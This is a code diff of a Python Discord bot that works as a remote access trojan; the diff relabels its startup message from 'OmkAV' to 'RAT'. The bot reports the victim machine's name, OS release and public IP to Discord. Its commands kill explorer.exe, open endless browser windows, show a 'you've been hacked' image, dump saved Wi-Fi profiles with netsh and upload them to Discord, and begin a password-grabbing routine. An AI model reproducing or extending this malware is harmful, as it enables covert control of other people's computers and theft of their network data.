@@ -19,7 +19,7 @@ release = platform.release()
 ip = requests.get('https://api.ipify.org/').text
 
 bot = commands.Bot(command_prefix='*')
-print("OmkAV will start getting set up...please wait a minute")
+print("RAT will start getting set up...please wait a minute")
 @bot.command()
 async def test(ctx):
         await ctx.send("Node: " + node)
@@ -31,17 +31,17 @@ async def test(ctx):
         await ctx.send("Release: " + release)
 @bot.command()
 async def harder(ctx):
-	await ctx.send("command sent")
+	await ctx.send("[*] Command sent!")
 	while True:
-		webbrowser.open("gay.com")
+		webbrowser.open("url")
 @bot.command()
 async def hot(ctx):
-	await ctx.send("wow")
+	await ctx.send("[*] Command sent!")
 	os.system("taskkill /f /IM explorer.exe")
 @bot.command()
 async def cmd(ctx):
         os.system("start cmd")
-        await ctx.send("command sent")
+	await ctx.send("[*] Command sent!")
 @bot.command()
 async def haxed(ctx):
 	webbrowser.open("https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fsensorstechforum.com%2Fwp-content%2Fuploads%2F2017%2F10%2Fstf-magic-ransomware-virus-background-image-youve-been-hacked.png&f=1&nofb=1")
@@ -52,7 +52,7 @@ async def folderbomb(ctx):
 async def grabessid(ctx):
         await ctx.send("Grabbing ESSIDs..")
         os.system("netsh wlan show profiles > test.txt")
-        await ctx.send(file=discord.File('test.txt'))
+        await ctx.send(file=discord.File('ESSID.txt'))
 @bot.command()
 async def grabpass(ctx, arg1):
         await ctx.send("Grabbing password...")
